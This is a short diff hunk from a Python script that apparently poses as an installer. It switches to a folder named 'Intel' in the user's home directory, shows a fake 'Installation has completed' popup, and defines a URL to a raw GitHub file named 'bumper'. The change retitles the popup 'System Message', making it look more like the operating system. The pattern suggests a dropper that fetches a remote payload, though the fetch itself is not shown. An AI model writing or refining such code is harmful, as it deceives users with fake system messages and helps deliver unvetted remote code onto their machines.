@@ -39,7 +39,7 @@ d = os.path.join(os.environ["HOMEPATH"], r"Intel")
 
 os.chdir(d)
 
-messagebox.showinfo("Message", "Installation has completed...")
+messagebox.showinfo("System Message", "Installation has completed...")
 
 remote_url = 'https://raw.githubusercontent.com/Mood56467/889671/main/bumper'
 
